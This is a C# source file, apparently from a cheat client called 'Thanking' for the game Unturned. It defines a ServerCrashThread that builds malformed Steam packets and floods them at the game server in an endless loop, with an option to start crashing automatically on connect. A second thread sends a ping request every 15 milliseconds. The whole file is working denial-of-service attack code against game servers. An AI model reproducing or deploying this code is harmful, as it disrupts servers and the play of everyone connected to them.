using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using SDG.Unturned;
using Steamworks;    
using Thanking.Attributes;
using Thanking.Options;
using Thanking.Overrides;
using Thanking.Utilities;
using UnityEngine;

namespace Thanking.Threads
{
    public static class ServerCrashThread
    {
        public static bool ServerCrashEnabled;
        public static bool AlwaysCrash;
        
        [Thread]
        public static void Start()
        {
            Provider.onClientDisconnected += () =>
            {
                ServerCrashEnabled = false;
                OV_Provider.IsConnected = false;
            };

            byte[] meme =
                Encoding.ASCII.GetBytes("I actually found another~3similarexploitswhicharenowpatched as well");

            List<byte> M1 = new List<byte> {(byte) ESteamPacket.BATTLEYE };
            List<byte> M2 = new List<byte> {(byte) ESteamPacket.WORKSHOP };
            List<byte> M3 = new List<byte> {(byte) ESteamPacket.GUIDTABLE };
            
            M1.AddRange(meme.ToList());
            M2.AddRange(meme.ToList());
            M3.AddRange(meme.ToList());

            byte[] P1 = M1.ToArray();
            byte[] P2 = M2.ToArray();
            byte[] P3 = M3.ToArray();

            int S1 = P1.Length;
            int S2 = P2.Length;
            int S3 = P3.Length;

            while (true)
            {
                if (AlwaysCrash && OV_Provider.IsConnected)
                    ServerCrashEnabled = true;

                if (ServerCrashEnabled)
                {
                    switch (MiscOptions.SCrashMethod)
                    {
                        case 1:
                            Provider.send(Provider.server, ESteamPacket.BATTLEYE, P1, S1, 0);
                            break;
                        case 2:
                            Provider.send(Provider.server, ESteamPacket.BATTLEYE, P2, S2, 0);
                            break;
                        case 3:
                            Provider.send(Provider.server, ESteamPacket.BATTLEYE, P3, S3, 0);
                            break;
                    }
                }
                else
                    Thread.Sleep(1000);
            }
        }

        [Thread]
        public static void PingCheck()
        {
            while (true)
            {
                Thread.Sleep(15);
                
                if (!OV_Provider.IsConnected)
                    continue;
                
                Provider.send(Provider.server, ESteamPacket.PING_REQUEST, new byte[]
                {
                    13
                }, 1, 0);
            }
        }
    }
}
